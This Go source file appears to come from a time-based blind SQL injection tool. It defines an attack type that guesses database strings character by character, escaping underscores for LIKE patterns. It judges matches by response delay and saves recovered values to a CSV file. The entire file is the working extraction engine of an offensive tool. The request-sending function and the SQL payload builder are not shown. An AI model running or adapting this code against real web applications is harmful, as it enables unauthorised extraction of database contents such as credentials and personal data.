package attack

import (
	"fmt"
	"time"

	"github.com/remoschaer86/blind-sql-go/internal/store"
)

type TimeBasedAttack struct {
	charset      string
	successDelay int
	delay        time.Duration
	sql          func(string, int) string
	csv          *store.Csv
}

func NewTimeBasedAttack(charset string, s func(string, int) string, sd int) *TimeBasedAttack {

	tba := &TimeBasedAttack{
		charset:      charset,
		sql:          s,
		successDelay: sd,
	}

	return tba
}

func (tba *TimeBasedAttack) probeByPrefix(prevPrefix string) error {

	stack := []string{prevPrefix}

	for len(stack) > 0 {
		currPrefix := stack[len(stack)-1]
		stack = stack[:len(stack)-1]

		foundNewPrefix := false

		for _, c := range tba.charset {

			time.Sleep(tba.delay * time.Millisecond)

			var nextPrefix string

			if string(c) == "_" {
				nextPrefix = fmt.Sprintf("%s\\_", currPrefix)
			} else {
				nextPrefix = fmt.Sprintf("%s%c", currPrefix, c)
			}

			fmt.Printf("testing: %s \n", nextPrefix)

			prefixFound, err := tba.SendRequest(nextPrefix)

			if err != nil {
				return fmt.Errorf("probeByPrefix() %w", err)
			}

			if prefixFound {
				fmt.Printf("found: %s \n", nextPrefix)

				foundNewPrefix = true
				stack = append(stack, nextPrefix)
			}
		}

		if !foundNewPrefix {
			fmt.Printf("success: no more characters: %s\n", currPrefix)
			tba.csv.AddRow([]string{currPrefix})
		}
	}

	return nil
}

func (tba *TimeBasedAttack) Launch(filepath string, delay int) error {

	csv, err := store.NewCsv(filepath)

	if err != nil {
		return fmt.Errorf("Launch() %w", err)
	}

	tba.csv = csv

	tba.delay = time.Duration(delay)

	err = tba.probeByPrefix("")

	if err != nil {
		return fmt.Errorf("Launch() %w", err)
	}

	tba.csv.Close()

	return nil

}

func (tba *TimeBasedAttack) Probe(str string) error {

	strFound, err := tba.SendRequest(str)

	fmt.Printf("%s: %t\n", str, strFound)

	if err != nil {
		return fmt.Errorf("Probe() %w", err)
	}

	return nil

}
